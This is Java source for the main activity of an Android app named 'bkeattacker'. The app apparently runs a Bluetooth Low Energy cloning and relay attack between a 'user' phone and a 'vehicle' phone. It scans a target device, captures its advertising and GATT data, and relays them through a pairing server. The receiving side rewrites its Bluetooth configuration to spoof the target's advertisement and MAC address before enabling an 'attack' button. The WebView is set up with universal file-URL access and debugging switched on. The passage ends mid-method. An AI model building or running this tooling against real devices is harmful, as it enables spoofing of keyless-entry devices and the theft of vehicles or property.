package com.example.bkeattacker;

import android.Manifest;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import java.util.ArrayList; 
import java.util.List; 
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import android.app.AlertDialog;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import android.content.Intent;
import android.content.pm.PackageManager;

import android.widget.Toast;

import androidx.annotation.NonNull;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.bkeattacker.BleScannerManager;
import com.example.blescanner.GattClientCallback;
import com.google.gson.Gson;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import com.journeyapps.barcodescanner.CaptureActivity;
import com.example.bkeattacker.WebLogManager;

import java.nio.charset.StandardCharsets; // For getting bytes
import java.util.concurrent.ExecutorService; // For background thread
import java.util.concurrent.Executors;     // For background thread


public class MainActivity extends AppCompatActivity implements BleScannerManager.ScanListener {

    public String getRole() {
        return Role;
    }

    public void setRole(String role) {
        Role = role;
    }

    private String Role = "D";

    private static final int REQUEST_SCAN_CODE = 1001;
    private static final int CAMERA_PERMISSION_REQUEST_CODE = 200;

    private static final String TAG = "MainActivity";
    private WebView webView;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // Page and pairing navigation control
    private volatile boolean allowAutoNavigateOnPair = false; // Set to true only after p8 or p2 identity has been confirmed
    private volatile String currentPage = "";

    // Pairing polling (only enabled on p8 page)
    private ScheduledExecutorService pairingPoller;
    private volatile boolean lastPaired = false;
    private volatile boolean navigatedOnPair = false;

    private BleScannerManager bleManager;
    private static final int REQUEST_BLE_PERMISSIONS_CODE = 101; // (BLE permission request code)
    private final Gson gson = new Gson(); // Used for JSON serialization

    // Store (serializable) scan results to be passed to WebView
    private List<BleScannerManager.SimpleDevice> latestScanResults = new ArrayList<>();
    private String currentScanMode = "manual";
    private String currentScanQuery = "";
    private List<BleScannerManager.SimplePacketPair> detailedPacketData = null; // Store broadcast packet information
    private JSONObject detailedGattData = null; // Store GATT JSON information
    private final ExecutorService backgroundExecutor = Executors.newSingleThreadExecutor();
    private String selectedDeviceMacAddress = null;
    private DupJsBridge dupJsBridgeInstance;
    private String cachedPacketDataJsonString = null;
    private volatile String receivedBroadcastDataJson = null;
    private volatile String receivedGattDataJson = null;

    private volatile String receivedStartClientAttack = null;
    private ScheduledExecutorService dataReceiverPoller;
    private BleScannerManager.SimpleDevice basicInfoForDetailsPage = null;

    private ConfigManager configManager = null;

    private Client bleClient = null;
    private Server bleServer = null;
    private BleAdvertiseThread bleAdvertiseThread;


    public JSONObject getDetailedPacketDataAsJsonObject() { // <-- Changed name and return type
        JSONObject resultObject = new JSONObject();
        JSONArray packetArray = new JSONArray(); // Default to empty array

        if (this.detailedPacketData != null && !this.detailedPacketData.isEmpty()) {
            try {
                // 1. Use Gson to convert the List to a JSON string
                String jsonString = gson.toJson(this.detailedPacketData);
                // 2. Use org.json.JSONArray to parse the string back into a JSONArray object
                packetArray = new JSONArray(jsonString);
            } catch (JSONException e) {
                Log.e(TAG, "Error converting detailedPacketData to JSONArray within JSONObject", e);
                // Keep packetArray as empty in case of error during parsing
            }
        }

        try {
            // 3. Put the JSONArray into the JSONObject, using "broadcastPackets" as the key
            resultObject.put("broadcastPackets", packetArray);
        } catch (JSONException e) {
            Log.e(TAG, "Error putting packetArray into result JSONObject", e);
            // Return an object with an empty array in case of error here
            try {
                resultObject.put("broadcastPackets", new JSONArray());
            } catch (JSONException ignored) {}
        }

        return resultObject;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        webView = new WebView(this);
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);                 // Enable JS (for H5 interaction)
        ws.setDomStorageEnabled(true);                 // For localStorage if needed
        ws.setAllowFileAccess(true);                   // Allow reading assets/config.yaml
        ws.setAllowFileAccessFromFileURLs(true);       // Allow file URL inter-access
        ws.setAllowUniversalAccessFromFileURLs(true);  // Needed for some models
        startPairingPolling();

        WebView.setWebContentsDebuggingEnabled(true);

        // Bind the global log singleton to the current WebView (for any class to log and display on the front end)
        WebLogManager.get().attach(webView, mainHandler);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                currentPage = url != null ? url : "";
                boolean isP8 = url != null && url.endsWith("/p8.html");
                if (isP8) {
                    // Enter p8 to start polling; reset navigation flag before entering
                    navigatedOnPair = false;
                    allowAutoNavigateOnPair = true; // PIN process allows automatic navigation
                    // Sync the role saved in the front end to native to avoid the default role on the native side
                    view.evaluateJavascript("(function(){try{var r=(localStorage.getItem('dup.role')||'U');if(window.Android&&Android.setLocalRole){Android.setLocalRole(r);}return r;}catch(e){return 'U';}})();", null);
                } else {
                    // Leave p8 to end polling
        //            stopPairingPolling();
                }
                boolean isP2 = url != null && url.endsWith("/p2.html");
                if (isP2) {
                    // Do not allow automatic navigation when entering p2 until the user confirms identity in p2
                    navigatedOnPair = false;
                    allowAutoNavigateOnPair = false;
                }
                boolean isP6 = url != null && url.endsWith("/p6.html");
                if (isP6) {
                    // When entering the p6 page, start the data receiving loop
                    Log.d(TAG, "Entering p6.html, starting data receiver...");
                    startDataReceivingLoop();
                } else {
                    // When leaving the p6 page, stop the data receiving loop
                    stopDataReceivingLoop();
                }
            }
        });

        // --- Initialize Bridges ---
        // 1. Initialize DupJsBridge FIRST and store the instance
        String tokenDir = getFilesDir().getAbsolutePath();
        this.dupJsBridgeInstance = new DupJsBridge(this, tokenDir); // Assign here
        webView.addJavascriptInterface(this.dupJsBridgeInstance, "DupClient");
        Log.d(TAG, "DupJsBridge registered and instance saved.");

        // 2. Initialize the UI Bridge ("Android") AFTER DupJsBridge
        webView.addJavascriptInterface(new Bridge(), "Android");
        Log.d(TAG, "Android Bridge registered.");
        // --- End Bridge Initialization ---

        bleManager = new BleScannerManager(this, this); // 'this' implements ScanListener

        // Set the token directory on the native side and check if long-token exists (compatible with both message/stream).
        // - Reconnection successful: directly enter p2
        // - Otherwise: enter p1
        String initialUrl = "file:///android_asset/p1.html";
        try {
            DupClientManager.setTokenFileDir(tokenDir);
            Log.d(TAG, "Token directory set to: " + tokenDir);

            File longTokenMsg = new File(tokenDir, "long-token-message");
            File longTokenStr = new File(tokenDir, "long-token-stream");
            boolean hasMsg = longTokenMsg.exists() && longTokenMsg.isFile() && longTokenMsg.length() > 0;
            boolean hasStr = longTokenStr.exists() && longTokenStr.isFile() && longTokenStr.length() > 0;
            Log.d(TAG, "Auto-reconnect check: msg=" + hasMsg + "(" + longTokenMsg.length() + "), str=" + hasStr + "(" + longTokenStr.length() + ")");
            if (hasMsg || hasStr) {
                int rc = DupClientManager.reconnectToServer();
                Log.i(TAG, "Auto reconnect attempted. rc=" + rc);
                if (rc == 0) {
                    initialUrl = "file:///android_asset/p2.html";
                }
            } else {
                Log.i(TAG, "No long-token found. Skip auto reconnect.");
            }
        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "Failed to load native library or find method", e);
        } catch (Exception e) {
            Log.e(TAG, "Error setting token dir or reconnecting", e);
        }

        // Load the corresponding page based on the judgment result
        webView.loadUrl(initialUrl);
        setContentView(webView);

        // ====== Keep previous demo/BLE related call examples (as is) ======
        try {
            String serviceUuid = "00002a00-0000-1000-8000-00805f9b34fb";       // Heart Rate Service (Example)
            String characteristicUuid = "00002a01-0000-1000-8000-00805f9b34fb"; // Heart Rate Measurement (Example)
            byte[] data = new byte[]{0x01, 0x00}; // Enable notification (typical value)

//            Log.i(TAG, "Calling writeCharacteristic from Java...");
//            ClientStub.writeCharacteristic(serviceUuid, characteristicUuid, data);
//            Log.i(TAG, "writeCharacteristic called successfully.");

        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "Failed to load native library or find method", e);
        } catch (Exception e) {
            Log.e(TAG, "Error calling writeCharacteristic", e);
        }
    }

    private void startBackgroundSendTask(final List<BleScannerManager.SimplePacketPair> packetsToSend, final JSONObject gattToSend) {
        Log.d(TAG, "[SYNC BG Task] Initiating background send.");

        if (packetsToSend == null) {
            Log.e(TAG, "[SYNC BG Task] Cannot start send task, packet data is null.");
            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Internal error: unable to prepare broadcast data", Toast.LENGTH_SHORT).show());
            return;
        }
        // Use a final copy of gattToSend or create empty if null
        final JSONObject finalGattToSend = (gattToSend != null) ? gattToSend : new JSONObject();


        backgroundExecutor.execute(() -> {
            Log.d(TAG, "[SYNC BG Task] Background task running.");
            boolean broadcastSent = false;
            boolean gattSent = false;
            if (!broadcastSent) {
                // --- Send Broadcast Data ("A-" prefix) ---
                try {
                    // Convert the passed packets list to JSON object { broadcastPackets: [...] }
                    JSONObject packetJsonObject = new JSONObject();
                    packetJsonObject.put("broadcastPackets", new JSONArray(gson.toJson(packetsToSend)));

                    String packetJsonString = packetJsonObject.toString();
                    // ... (rest of broadcast sending logic using packetJsonString) ...
                    String prefixedPacketString = "A-" + packetJsonString;
                    byte[] packetBytes = prefixedPacketString.getBytes(StandardCharsets.UTF_8);
                    String broadcastBase64 = Base64.encodeToString(packetBytes, Base64.NO_WRAP);
                    Log.d(TAG, "[SYNC BG Task] Prepared Broadcast Data (Base64 starts with): " + broadcastBase64.substring(0, Math.min(30, broadcastBase64.length())) + "...");

                    Log.d(TAG, "[SYNC BG Task] >>>>> Sending Broadcast Base64 String:\n" + broadcastBase64);

                    int attempts = 0;
                    int result = 0;
                    do { /* ... sending loop ... */
                        attempts++;
                        Log.d(TAG, "[SYNC BG Task] Attempting to send Broadcast Data (Attempt " + attempts + ")");
                        try {
                            result = dupJsBridgeInstance.sendMessageData(broadcastBase64);
                            Log.d(TAG, "[SYNC BG Task] sendMessageData(Broadcast) result: " + result);
                        } catch (UnsatisfiedLinkError | Exception e) {
                            Log.e(TAG, "[SYNC BG Task] Error calling sendMessageData(Broadcast)", e);
                            result = -1;
                            break;
                        }
                        if (result != 1) Thread.sleep(500);
                    } while (result != 1);
                    broadcastSent = (result == 1);
                    if (broadcastSent)
                        Log.i(TAG, "[SYNC BG Task] Broadcast Data sent successfully after " + attempts + " attempts.");
                    else Log.e(TAG, "[SYNC BG Task] Failed to send Broadcast Data.");

                } catch (Exception e) { /* ... error handling ... */ }
            }
            // --- Send GATT Data ("S-" prefix) ---
            if (broadcastSent) {
                try {
                    String gattJsonString = finalGattToSend.toString();
                    if (gattJsonString.equals("{}")) { /* ... skip empty ... */ gattSent = true; }
                    else {

                        byte[] oriGattBytes = gattJsonString.getBytes(StandardCharsets.UTF_8);
                        String oriGattBase64 = Base64.encodeToString(oriGattBytes, Base64.NO_WRAP);
                        dupJsBridgeInstance.setGlobalUUIDMap(oriGattBase64);

                        // ... (rest of GATT sending logic using gattJsonString) ...
                        String prefixedGattString = "S-" + gattJsonString;
                        byte[] gattBytes = prefixedGattString.getBytes(StandardCharsets.UTF_8);
                        String gattBase64 = Base64.encodeToString(gattBytes, Base64.NO_WRAP);
                        Log.d(TAG, "[SYNC BG Task] Prepared GATT Data (Base64 starts with): " + gattBase64.substring(0, Math.min(30, gattBase64.length())) + "...");

                        Log.d(TAG, "[SYNC BG Task] >>>>> Sending GATT Base64 String:\n" + gattBase64);

                        int attempts = 0; int result = 0;
                        do { /* ... sending loop ... */
                            attempts++; Log.d(TAG, "[SYNC BG Task] Attempting to send GATT Data (Attempt " + attempts + ")");
                            try { result = dupJsBridgeInstance.sendMessageData(gattBase64); Log.d(TAG, "[SYNC BG Task] sendMessageData(GATT) result: " + result); }
                            catch (UnsatisfiedLinkError | Exception e) { Log.e(TAG, "[SYNC BG Task] Error calling sendMessageData(GATT)", e); result = -1; break; }
                            if (result != 1) Thread.sleep(500);
                        } while (result != 1);
                        gattSent = (result == 1);
                        if(gattSent) Log.i(TAG, "[SYNC BG Task] GATT Data sent successfully after " + attempts + " attempts."); else Log.e(TAG, "[SYNC BG Task] Failed to send GATT Data.");
                    }
                } catch (Exception e) { /* ... error handling ... */ }
            } else { /* ... skipping GATT ... */ gattSent = false; }


            // --- Post-Send Actions (Back on Main Thread) ---
            final boolean finalSuccess = broadcastSent && gattSent;
            mainHandler.post(() -> {
                if (finalSuccess) {
                    // (If both A and S are sent successfully)
                    Toast.makeText(MainActivity.this, "Data synchronization completed", Toast.LENGTH_SHORT).show();

                    // ****** This is the navigation you want ******
                    if (webView != null) {
                        webView.loadUrl("file:///android_asset/p51.html");
                    }
                    // **********************************

                } else {
                    // (If any of them fails)
                    Toast.makeText(MainActivity.this, "Data synchronization failed", Toast.LENGTH_LONG).show();
                    if (webView != null) {
                        // (UI returns to step 2, allowing retry)
                        webView.evaluateJavascript("javascript:setStep(2);", null);
                    }
                }
            });
            Log.d(TAG, "[SYNC BG Task] Background task finished. Success: " + finalSuccess);

        });
    }

    private long parseDelayMs(byte[] data) {
        if (data == null || data.length < 8) {
            return -1;
        }
        try {
            // Go uses binary.BigEndian.PutUint64, so it must be parsed with BIG_ENDIAN
            java.nio.ByteBuffer bb = java.nio.ByteBuffer.wrap(data, 0, 8);
            bb.order(java.nio.ByteOrder.BIG_ENDIAN);
            long delayNanos = bb.getLong(); // This is nanoseconds!
    
            // Convert to milliseconds (1 ms = 1,000,000 ns)
            long delayMs = delayNanos / 1_000_000;
    
            return delayMs;
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse delay from data", e);
            return -1;
        }
    }

    private void updateLatencyToWebView(long delayMsRaw) {
        if (webView == null) return;
        long ms = delayMsRaw;
        if (ms < 0) return;
        if (ms > 999) ms = 999; // Max 999
        final long finalMs = ms;
        // Color: Low latency (blue) <=80; Medium latency (yellow) 81-200; High latency (red) >200
        String js = "(function(){" +
                "var ms=" + finalMs + ";" +
                "var el=document.getElementById('delayIndicator')||document.getElementById('latencyIndicator');" +
                "if(!el){var ls=document.getElementsByClassName('delay-indicator'); if(ls&&ls.length>0) el=ls[0];}" +
                "if(!el){var ls2=document.getElementsByClassName('latency-indicator'); if(ls2&&ls2.length>0) el=ls2[0];}" +
                "if(el){" +
                    // Text: If the original text contains "delay" in Chinese, keep the prefix; otherwise, just display "38ms"
                    "var txt=el.textContent||'';" +
                    "if(/delay|latency/i.test(txt)){el.textContent='Delay: ' + ms + 'ms';} else {el.textContent= ms + 'ms';}" +
                    // Color
                    "var color = (ms<=80)?'#1a3f7a':(ms<=200?'#d69e2e':'#e53e3e');" +
                    "el.style.color=color;" +
                "}" +
            "})();";
        mainHandler.post(() -> webView.evaluateJavascript(js, null));
    }

    private synchronized void startPairingPolling() {
        if (pairingPoller != null && !pairingPoller.isShutdown()) return;
        lastPaired = false; // Re-observe the status every time you enter p8
        pairingPoller = Executors.newSingleThreadScheduledExecutor();
        pairingPoller.scheduleAtFixedRate(() -> {
            try {
                String b64 = DupClientManager.readTimeStamp();
                if (b64 == null || b64.isEmpty()) return;
                byte[] data = Base64.decode(b64, Base64.DEFAULT);
                if (data == null || data.length < 10) return;

                // First 8 bytes are delay (milliseconds), 9th byte is pairing flag, 10th byte is role
                long delayMs = parseDelayMs(data);
                updateLatencyToWebView(delayMs);

                boolean paired = data[8] != 0;
                char role = (char) data[9];
                if(role=='U'||role=='V'){
                    this.setRole(String.valueOf(role));
                }
               // Log.d(TAG, "Pairing state changed: " + lastPaired + " -> " + paired + ", role=" + role + ", delayMs=" + delayMs);
                // if (paired != lastPaired) {
                //     Log.d(TAG, "Pairing state changed: " + lastPaired + " -> " + paired + ", role=" + role);
                //     lastPaired = paired;
                // }
                if (paired && !navigatedOnPair) {
                    navigatedOnPair = true;
                    navigateOnPaired(role);


//                    DupClientManager.WaitResponseUnlock((byte) 0x13);
//                    Log.d(TAG, "WaitResponseUnLock");
                    // End polling immediately after successful pairing
                    // stopPairingPolling();
                }
            } catch (Throwable t) {
                Log.e(TAG, "pairing polling error", t);
            }
        }, 100, 1000, TimeUnit.MILLISECONDS);
    }

    private synchronized void stopPairingPolling() {
        if (pairingPoller != null) {
            pairingPoller.shutdownNow();
            pairingPoller = null;
        }
    }

    private synchronized void startDataReceivingLoop() {
        // Make sure the old poller is stopped
        stopDataReceivingLoop();

        // Reset storage variables
        receivedBroadcastDataJson = null;
        receivedGattDataJson = null;
        receivedStartClientAttack = null;

        Log.d(TAG, "[Receiver] Starting data receiving poll...");
        dataReceiverPoller = Executors.newSingleThreadScheduledExecutor();
        dataReceiverPoller.scheduleWithFixedDelay(() -> {
            try {
                // 1. Check if all have been received
                if (receivedBroadcastDataJson != null && receivedGattDataJson != null && receivedStartClientAttack !=null) {
                    // Both received, trigger completion
                    Log.i(TAG, "[Receiver] Both broadcast and GATT data have been received.");
                    onDataReceptionComplete(); // (This method will stop polling)
                    return;
                }

                // 2. Call DupClientManager.readMessageData() to read the data

                if (dupJsBridgeInstance == null) {
                    Log.e(TAG, "[Receiver] DupJsBridge is null, cannot read data.");
                    return; // Retry later
                }

                // ===============================================
                Log.d(TAG, "[Receiver] Before reading...");
                String base64Data = dupJsBridgeInstance.readMessageData(); // <--- Assumed reading function
                Log.d(TAG, "[Receiver] ..." + base64Data);
                Log.d(TAG, "[Receiver] After reading...");
                // ===============================================

                // 3. Process the read data
                if (base64Data != null && !base64Data.isEmpty()) {
                    Log.d(TAG, "[Receiver] Received raw Base64 data: " + base64Data.substring(0, Math.min(20, base64Data.length())) + "...");
                    String decodedString = "";
                    try {
                        byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
                        decodedString = new String(data, StandardCharsets.UTF_8);
                    } catch (Exception e) {
                        Log.e(TAG, "[Receiver] Base64 decoding failed", e);
                        return; // Data corrupted, wait for the next one
                    }

                    // 4. Check the prefix and store
                    if (decodedString.startsWith("A-")) {
                        receivedBroadcastDataJson = decodedString.substring(2); // Remove "A-"
                        Log.i(TAG, "[Receiver] Successfully stored [A-] broadcast data.");

                        // (Optional) Immediately send feedback to the p6 log area
                        mainHandler.post(() -> {
                            if (webView != null) {

                                WebLogManager.get().log("Received [A-] broadcast data",WebLogManager.LOG_SYS);
                            }
                        });

                    } else if (decodedString.startsWith("S-")) {
                        receivedGattDataJson = decodedString.substring(2); // Remove "S-"
                        Log.i(TAG, "[Receiver] Successfully stored [S-] service data.");

                        byte[] receivedGattDataJsonBytes = receivedGattDataJson.getBytes(StandardCharsets.UTF_8);
                        String receivedGattDataJsonBase64 = Base64.encodeToString(receivedGattDataJsonBytes, Base64.NO_WRAP);
                        dupJsBridgeInstance.setGlobalUUIDMap(receivedGattDataJsonBase64);

                        // (Optional) Immediately send feedback to the p6 log area
                        mainHandler.post(() -> {
                            if (webView != null) {
                                WebLogManager.get().log("Received [S-] service data",WebLogManager.LOG_SYS);
                            }
                        });
                    }else  if (decodedString.startsWith("B-")){
                        receivedStartClientAttack = "B-";
                        Log.i(TAG, "[Receiver] Successfully stored [B-] client start attack.");
                    }
                    else {
                        Log.w(TAG, "[Receiver] Received data with unknown prefix: " + decodedString.substring(0, Math.min(20, decodedString.length())));
                    }
                }

            } catch (Throwable t) {
                Log.e(TAG, "[Receiver] Poller error", t);
            }
        }, 0, 10, TimeUnit.MILLISECONDS);
    }

    private void onDataReceptionComplete() {
        // 1. Stop polling
        stopDataReceivingLoop();

        // 2. (Optional) Print the complete JSON data you received here (for debugging)
        Log.d(TAG, "[Receiver] Final broadcast data (JSON): " + receivedBroadcastDataJson);
        Log.d(TAG, "[Receiver] Final GATT data (JSON): " + receivedGattDataJson);

        //Initialize configManager, and write to Bluetooth related files to modify broadcast and mac address
        configManager = ConfigManager.buildFromJson(receivedGattDataJson, receivedBroadcastDataJson);
        //TODO: Commented out for debugging convenience
        configManager.writeToBluetoothDir(this);

        // 3. Update UI on the main thread
        mainHandler.post(() -> {
            if (webView != null) {
                // Call the newly added JS function in p6.html
                webView.evaluateJavascript("javascript:enableAttackButton();", null);
            }
        });
    }

    private synchronized void stopDataReceivingLoop() {
        if (dataReceiverPoller != null && !dataReceiverPoller.isShutdown()) {
            Log.d(TAG, "[Receiver] Stopping data receiving poll...");
            dataReceiverPoller.shutdownNow();
            dataReceiverPoller = null;
        }
    }

    private void navigateOnPaired(char role) {

        final String target;
        if (role == 'V') {
            target = "file:///android_asset/p6.html"; // Vehicle -> p6
        } else if (role == 'U') {
            target = "file:///android_asset/p3.html"; // User -> p3
        } else {
            // Unknown or neutral role, default to p3 (can be adjusted as needed)
            target = "file:///android_asset/p3.html";
        }
        Log.i(TAG, "Paired, navigating to: " + target + ", role=" + role);
        mainHandler.post(() -> {
            if (webView != null) {
                // Clear the front-end cached PIN (cleared on both ends after pairing is complete)
                webView.evaluateJavascript("try{localStorage.removeItem('dup.last_pin');localStorage.removeItem('dup.pin_sent');}catch(e){}", null);
                webView.loadUrl(target);
            }
        });
    }


    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (backgroundExecutor != null && !backgroundExecutor.isShutdown()) {
            backgroundExecutor.shutdown(); // Request shutdown
        }
        stopPairingPolling();
        stopDataReceivingLoop();
        if (bleManager != null) { // (New) Stop any ongoing scans
            bleManager.stopActiveScan();
        }
        if (webView != null) {
            // Avoid memory leaks
            webView.destroy();
            webView = null;
        }
        super.onDestroy();
    }

    private boolean checkCameraPermission() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    private void requestCameraPermission() {
        ActivityCompat.requestPermissions(this,
                new String[]{android.Manifest.permission.CAMERA},
                CAMERA_PERMISSION_REQUEST_CODE);
    }

    private void startCaptureActivity() {
        // Directly start ZXing's CaptureActivity
        Intent intent = new Intent(this, AdaptiveCaptureActivity.class);
        // Other optional parameters:
        intent.putExtra("PROMPT_MESSAGE", "Place the QR code inside the frame");
        startActivityForResult(intent, REQUEST_SCAN_CODE);
    }

    public void triggerScan(String mode, String query) {
        this.currentScanMode = mode;
        this.currentScanQuery = query;
        Log.d(TAG, "Triggering BLE scan. Mode: " + mode + ", Query: " + query);
        // bleManager will check permissions internally
        bleManager.startScan(mode, query, 5000); // Scan for 5 seconds
    }

    public String getLatestScanResultsAsJson() {
        return gson.toJson(latestScanResults);
    }

    public void navigateBackToP3() {
        mainHandler.post(() -> {
            if (webView != null) {
                webView.loadUrl("file:///android_asset/p3.html?from=p4");
            }
        });
    }

    public void handleSync(String selectedDeviceJson) {
        Log.d(TAG, "Sync confirmed for: " + selectedDeviceJson);
        // Add your gRPC or MQTT synchronization logic here...

        mainHandler.postDelayed(() -> {
            if (webView != null) {
                webView.loadUrl("file:///android_asset/p51.html");
            }
        }, 800);
    }

    public void showDeviceDetails(String selectedDeviceJson) {
        Log.d(TAG, "[DETAILS] Show details requested for: " + selectedDeviceJson);

        // --- Clear previous detail data ---
        this.basicInfoForDetailsPage = null; // Clear basic info
        this.detailedPacketData = null;
        this.detailedGattData = null;

        // 1. Parse and store basic info AND packet data
        BleScannerManager.SimpleDevice simpleDevice = null;
        try {
            simpleDevice = gson.fromJson(selectedDeviceJson, BleScannerManager.SimpleDevice.class);
        } catch (Exception e) {
            Log.e(TAG, "showDeviceDetails: Error parsing selectedDeviceJson", e);
        }

        if (simpleDevice == null || simpleDevice.address == null) {
            Log.e(TAG, "showDeviceDetails: Failed to parse basic info or MAC address is missing.");
            Toast.makeText(this, "Failed to parse device information", Toast.LENGTH_SHORT).show();
            return;
        }
        this.basicInfoForDetailsPage = simpleDevice; // Store basic info
        this.detailedPacketData = simpleDevice.packedPackets; // Store packet data
        Log.d(TAG, "[DETAILS] Stored basic info and " + (detailedPacketData != null ? detailedPacketData.size() : 0) + " packet pairs.");


        // 2. Get Native Device
        final BluetoothDevice nativeDevice = bleManager.getDeviceByMac(simpleDevice.address);
        if (nativeDevice == null) {
            Log.e(TAG, "showDeviceDetails: Cannot get native device for MAC: " + simpleDevice.address);
            Toast.makeText(this, "Error: Device not found (may be out of range)", Toast.LENGTH_SHORT).show();
            // Still navigate, p9 will show error
            navigateToP9();
            return;
        }

        // --- 3. Asynchronously fetch GATT ---
        Toast.makeText(this, "Getting services for " + simpleDevice.name + "...", Toast.LENGTH_SHORT).show();
        GattClientCallback.getDeviceInfoAsJson(nativeDevice, this, new GattClientCallback.DeviceInfoCallback() {
            @Override
            public void onInfoReady(JSONObject deviceInfo) {
                Log.d(TAG, "[DETAILS] GATT fetch successful.");
                MainActivity.this.detailedGattData = deviceInfo; // Store GATT JSON
                // --- Navigate AFTER GATT is ready ---
                navigateToP9();
            }

            @Override
            public void onError(String errorMessage) {
                Log.e(TAG, "[DETAILS] GATT fetch error: " + errorMessage);
                MainActivity.this.detailedGattData = null; // Mark GATT as failed
                mainHandler.post(() -> Toast.makeText(MainActivity.this, "GATT Error: " + errorMessage, Toast.LENGTH_LONG).show());
                // --- Navigate even if GATT failed ---
                navigateToP9();
            }
        });
    } // showDeviceDetails finished

    private void navigateToP9() {
        mainHandler.post(() -> {
            if (webView != null) {
                Log.d(TAG, "[NAV] Navigating to p9.html");
                webView.loadUrl("file:///android_asset/p9.html");
            } else {
                Log.e(TAG, "[NAV] WebView is null, cannot navigate to p9.html");
            }
        });
    }

    private void showDetailsDialog(String deviceName, String macAddress) {
        StringBuilder messageBuilder = new StringBuilder();

        // --- 1. Add broadcast packet information (using new field names) ---
        messageBuilder.append("--- Broadcast Packet Information ---\n");
        if (detailedPacketData != null && !detailedPacketData.isEmpty()) {
            for (int i = 0; i < detailedPacketData.size(); i++) {
                BleScannerManager.SimplePacketPair pair = detailedPacketData.get(i);
                messageBuilder.append("Packet ").append(i + 1).append(":\n");
                // Change: Use pair.adv_data
                messageBuilder.append("  adv_data: ").append(pair.adv_data != null ? pair.adv_data : "(empty)").append("\n");
                // Change: Use pair.adv_resp
                if (pair.adv_resp != null) {
                    messageBuilder.append("  adv_resp: ").append(pair.adv_resp).append("\n");
                }
            }
        } else {
            messageBuilder.append("(No broadcast packet data)\n");
        }
        messageBuilder.append("\n"); // Add a blank line for separation

        // --- 2. Add GATT service information (unchanged) ---
        messageBuilder.append("--- GATT Service Information ---\n");
        // ... (GATT display logic remains the same) ...
        if (detailedGattData != null) {
            try {
                messageBuilder.append(detailedGattData.toString(4));
            } catch (JSONException e) { /* ... */ }
        } else {
            messageBuilder.append("(Failed to get GATT service or not completed)");
        }


        // --- 3. Build and display AlertDialog (unchanged) ---
        new AlertDialog.Builder(this)
                .setTitle("Device Details: " + deviceName + " (" + macAddress + ")")
                .setMessage(messageBuilder.toString())
                .setPositiveButton("Close", (dialog, which) -> dialog.dismiss())
                .show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == CAMERA_PERMISSION_REQUEST_CODE) {
            // Your existing camera permission logic
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startCaptureActivity();
            } else {
                Toast.makeText(this, "Camera permission is required to scan", Toast.LENGTH_SHORT).show();
            }
        }
        else if (requestCode == REQUEST_BLE_PERMISSIONS_CODE) {
            // (New) BLE permission logic
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Log.d(TAG, "BLE Permissions granted. Retrying scan...");
                // Permissions granted, retrying scan
                triggerScan(currentScanMode, currentScanQuery);
            } else {
                Toast.makeText(this, "Bluetooth scanning permission denied", Toast.LENGTH_LONG).show();
            }
        }else if (requestCode == REQUEST_BLUETOOTH_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                if (bleServer == null){
                    bleServer = new Server(MainActivity.this, configManager,configManager.getDeviceAddress());
                }
                while(!bleServer.start()){
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                };
                startBleAdvertising();
            } else {
                Toast.makeText(this, "Missing necessary Bluetooth permissions, cannot start service", Toast.LENGTH_LONG).show();
            }
        }
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_SCAN_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // Extract result from Intent extra (ZXing standard key)
                String contents = data.getStringExtra("SCAN_RESULT");
                String format = data.getStringExtra("SCAN_RESULT_FORMAT");

                if (contents != null) {
                    Log.d(TAG, "Scan successful, content: " + contents);
                    int status=DupClientManager.fetchPinToken(contents);
                    DupClientManager.RegisterPair(this.Role);

                    Log.d(TAG, "Format: " + format);
                    // You can do other processing here, for example, displaying a Toast
                    // Toast.makeText(this, "Result: " + contents, Toast.LENGTH_LONG).show();
                } else {
                    Log.w(TAG, "Scan returned empty content");
                }
            } else if (resultCode == RESULT_CANCELED) {
                Log.i(TAG, "User cancelled the scan");
            }
        }

    }

    @Override
    public void onScanStarted() {
        Log.d(TAG, "BLE Scan started...");
        // (Optional) Notify WebView that the scan has started
    }

    @Override
    public void onScanFinished(List<BleScannerManager.SimpleDevice> filteredDevices) {
        Log.d(TAG, "BLE Scan finished. Found " + filteredDevices.size() + " devices.");

        // 1. Store (serializable) results
        latestScanResults = filteredDevices;

        // 2. Notify WebView to navigate to p4.html
